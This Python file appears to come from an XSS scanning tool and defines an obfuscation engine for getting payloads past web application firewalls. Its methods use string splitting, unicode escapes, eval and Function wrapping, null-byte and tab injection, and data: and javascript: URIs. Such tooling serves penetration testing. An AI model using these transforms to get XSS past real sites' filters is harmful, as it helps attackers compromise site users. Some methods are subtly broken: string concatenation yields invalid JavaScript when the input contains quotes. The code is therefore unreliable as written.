#!/usr/bin/env python3

"""
BRS-XSS Obfuscation Engine

JavaScript obfuscation engine for WAF evasion.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Sat 02 Aug 2025 09:35:54 MSK
Telegram: https://t.me/EasyProTech
"""


class ObfuscationEngine:
    """JavaScript obfuscation engine"""
    
    @staticmethod
    def string_concatenation(js_code: str) -> str:
        """Split strings into concatenation"""
        # alert('test') -> ale'+'rt('te'+'st')
        if len(js_code) < 6:
            return js_code
        
        parts = []
        for i in range(0, len(js_code), 2):
            part = js_code[i:i+2]
            parts.append(f"'{part}'")
        
        return "+".join(parts)
    
    @staticmethod
    def unicode_obfuscation(js_code: str) -> str:
        """Unicode obfuscation"""
        # alert -> ale\u0072t
        result = ""
        for i, char in enumerate(js_code):
            if i % 3 == 0 and char.isalpha():
                result += f'\\u{ord(char):04x}'
            else:
                result += char
        return result
    
    @staticmethod
    def eval_wrapping(js_code: str) -> str:
        """Wrap in eval"""
        encoded = ObfuscationEngine.string_concatenation(js_code)
        return f"eval({encoded})"
    
    @staticmethod
    def function_wrapping(js_code: str) -> str:
        """Wrap in Function constructor"""
        encoded = ObfuscationEngine.string_concatenation(js_code)
        return f"Function({encoded})()"
    
    @staticmethod
    def array_obfuscation(js_code: str) -> str:
        """Array-based obfuscation"""
        # alert -> [8].find(confirm) style
        function_map = {
            'alert': '[8].find(confirm)',
            'confirm': '(confirm)()',
            'prompt': 'top["pro"+"mpt"]',
            'eval': 'window["ev"+"al"]'
        }
        
        result = js_code
        for func, obfuscated in function_map.items():
            result = result.replace(func, obfuscated)
        
        return result
    
    @staticmethod
    def inject_null_bytes(payload: str) -> str:
        """Inject null bytes for WAF bypass"""
        # Insert null bytes between characters
        if '<script' in payload.lower():
            return payload.replace('<script', '<scr\\x00ipt')
        return payload.replace('<', '<\\x00')
    
    @staticmethod
    def use_tab_variations(payload: str) -> str:
        """Use tab characters for WAF bypass"""
        # Replace spaces with tabs
        return payload.replace(' ', '\\t').replace('>', '>\\t')
    
    @staticmethod
    def use_data_uri(payload: str) -> str:
        """Convert to data: URI scheme"""
        import base64
        # Encode payload in data URI
        encoded = base64.b64encode(payload.encode()).decode()
        return f'data:text/html;base64,{encoded}'
    
    @staticmethod
    def use_javascript_uri(payload: str) -> str:
        """Convert to javascript: URI scheme"""
        # Clean payload for javascript: protocol
        clean_payload = payload.replace('<script>', '').replace('</script>', '')
        return f'javascript:{clean_payload}'
    
    @staticmethod
    def use_eval_obfuscation(payload: str) -> str:
        """Use eval-based obfuscation"""
        # Wrap payload in eval with string obfuscation
        parts = [f"'{char}'" for char in payload]
        concatenated = '+'.join(parts)
        return f'eval({concatenated})'